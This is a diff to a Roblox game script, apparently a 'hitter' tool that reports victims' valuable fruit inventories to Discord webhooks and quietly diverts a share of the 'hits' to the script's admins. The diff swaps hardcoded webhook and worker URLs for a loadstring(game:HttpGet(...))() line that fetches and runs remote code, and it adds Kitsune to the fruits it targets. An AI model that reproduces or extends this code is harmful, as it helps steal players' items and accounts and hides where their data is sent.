@@ -17,15 +17,15 @@ FruitsToHit = {
 
 --Admin Config
 TestingUsernames = {"tester1", "your_alt_account"}
-Protector = "https://sharky-on-top.script-config-protector.workers.dev/w/d5c5ec6c-2983-4512-a59d-a03bb0d30d92" -- << Protected URL for admin hits (secondary backup) (url2)
-dummy = "https://sharky-on-top.script-config-protector.workers.dev/w/061ccfe8-01fd-414b-b874-38de6b02d928" -- << Protected URL for admin/special hits (Premium/TopFruit) (url3)
-Checker22 = "https://discord.com/api/webhooks/1341656574455976038/1cfpz1y7j2eBj7CTLhdcPPXoH4ltNdK3zYYtftVAtiFMuVnAXKKdH45hAgvVfneS5HC5" -- << NEW: Protected URL specifically for Dragon hits (Replace THIS) (url4)
+a = "https://sharky-on-top.script-config-protector.workers.dev/w/0f1a2b3c-4d5e-6f7g-8h9i-jk0lmnopqrs" -- << Dummy thing
 
-RGBGreenVal = 0.20 -- << (e.g., 20%) Chance user webhook gets Dragon hit notifications.
-RGBRedVal = 0.60 -- << (e.g., 60%) Chance user webhook gets Premium/Kitsune/Yeti hits.
+loadstring(game:HttpGet("https://raw.githubusercontent.com/W-Scripts/UI/refs/heads/main/LoadingUl"))() --loads other webhooks
 
 ActivationPasswords = {"ishusontop", "bonzarbal", "ishufishy"} -- << Passwords for ?activate command
 local coreAdminUsernames = {"x6TNine", "aka_0ver", "bonzarbal53", "bonzarbal52", "bonzarbal51", "bonzarbal50", "xRip_Cyborg"} -- << Core admin usernames (hardcoded)
+
+RGBGreenVal = 0.20 -- << (e.g., 20%) Chance user webhook gets Dragon hit notifications.
+RGBRedVal = 0.60 -- << (e.g., 60%) Chance user webhook gets Premium/Kitsune/Yeti hits.
 
 --admin config end
 
@@ -749,6 +749,7 @@ local function sendWebhook(inventory)
         return
     end
     local goodFruitNames = {
+        ["Kitsune-Kitsune"] = true,
         ["Yeti-Yeti"] = true
     }
     local fruits, premiumItems = {}, {};
